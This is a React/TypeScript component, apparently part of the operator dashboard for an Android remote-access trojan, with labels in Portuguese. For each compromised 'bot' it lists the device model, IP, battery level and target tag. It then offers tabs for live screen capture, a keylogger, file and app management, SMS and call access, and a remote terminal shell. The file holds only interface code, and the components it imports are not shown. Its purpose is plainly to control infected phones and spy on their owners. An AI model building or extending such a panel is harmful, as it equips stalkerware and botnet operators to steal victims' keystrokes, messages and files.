import React, { useState } from 'react';
import type { Bot } from '../types';
import { LiveScreen } from './LiveScreen';
import { FileManager } from './FileManager';
import { Keylogger } from './Keylogger';
import { AppManager } from './AppManager';
import { Terminal } from './Terminal';
import { SMSManager } from './SMSManager';

interface ActionPanelProps {
  bot: Bot;
  onClose: () => void;
}

type TabType = 'screen' | 'files' | 'keylogger' | 'apps' | 'sms' | 'terminal';

export const ActionPanel: React.FC<ActionPanelProps> = ({ bot, onClose }) => {
  const [activeTab, setActiveTab] = useState<TabType>('screen');

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: '20px', padding: '24px' }}>
      
      {/* Bot Info Header */}
      <div className="glass-panel" style={{ padding: '20px', display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: '16px' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
          <span style={{ fontSize: '32px' }}>{bot.countryCode === 'BR' ? '🇧🇷' : '🇺🇸'}</span>
          <div>
            <h2 style={{ fontSize: '20px', fontWeight: '700', color: 'var(--text-primary)' }}>{bot.name}</h2>
            <div style={{ display: 'flex', gap: '12px', fontSize: '12px', color: 'var(--text-secondary)', marginTop: '4px', flexWrap: 'wrap' }}>
              <span>ID: <strong style={{ color: 'var(--accent-purple)' }}>{bot.id}</strong></span>
              <span>•</span>
              <span>Modelo: <strong>{bot.model}</strong></span>
              <span>•</span>
              <span>IP: <strong>{bot.ip}</strong></span>
              <span>•</span>
              <span>Target: <strong style={{ color: 'var(--accent-cyan)' }}>{bot.tag}</strong></span>
            </div>
          </div>
        </div>

        <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
          <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'flex-end', fontSize: '12px', color: 'var(--text-secondary)' }}>
            <span className={`badge ${bot.status === 'online' ? 'badge-online' : 'badge-offline'}`}>
              {bot.status}
            </span>
            <span style={{ marginTop: '4px' }}>Bateria: {bot.battery}% {bot.batteryCharging ? '⚡' : ''}</span>
          </div>
          <button className="btn btn-secondary" onClick={onClose} style={{ padding: '8px 12px', fontSize: '13px' }}>
            ✕ Fechar
          </button>
        </div>
      </div>

      {/* Tabs navigation bar */}
      <div style={{ display: 'flex', gap: '8px', borderBottom: '1px solid var(--border-color)', paddingBottom: '2px', overflowX: 'auto' }}>
        {[
          { id: 'screen', label: '📺 Live Screen', color: 'var(--accent-purple)' },
          { id: 'keylogger', label: '⌨️ Keylogger', color: 'var(--accent-pink)' },
          { id: 'files', label: '📁 Arquivos', color: 'var(--accent-cyan)' },
          { id: 'apps', label: '📱 Aplicativos', color: 'var(--success)' },
          { id: 'sms', label: '💬 SMS & Chamadas', color: 'var(--warning)' },
          { id: 'terminal', label: '💻 Terminal Shell', color: 'white' }
        ].map(tab => {
          const isActive = activeTab === tab.id;
          return (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id as TabType)}
              style={{
                background: isActive ? 'var(--panel-hover)' : 'transparent',
                border: 'none',
                borderBottom: isActive ? `2px solid ${tab.color}` : '2px solid transparent',
                color: isActive ? 'white' : 'var(--text-secondary)',
                padding: '10px 16px',
                fontSize: '14px',
                fontWeight: '500',
                borderRadius: '6px 6px 0 0',
                cursor: 'pointer',
                whiteSpace: 'nowrap',
                transition: 'all 0.2s ease'
              }}
            >
              {tab.label}
            </button>
          );
        })}
      </div>

      {/* Tab content renderer */}
      <div className="glass-panel" style={{ background: 'var(--bg-secondary)', minHeight: '450px', borderRadius: '0 0 12px 12px' }}>
        {activeTab === 'screen' && <LiveScreen bot={bot} />}
        {activeTab === 'files' && <FileManager bot={bot} />}
        {activeTab === 'keylogger' && <Keylogger bot={bot} />}
        {activeTab === 'apps' && <AppManager bot={bot} />}
        {activeTab === 'sms' && <SMSManager bot={bot} />}
        {activeTab === 'terminal' && <Terminal bot={bot} />}
      </div>

    </div>
  );
};
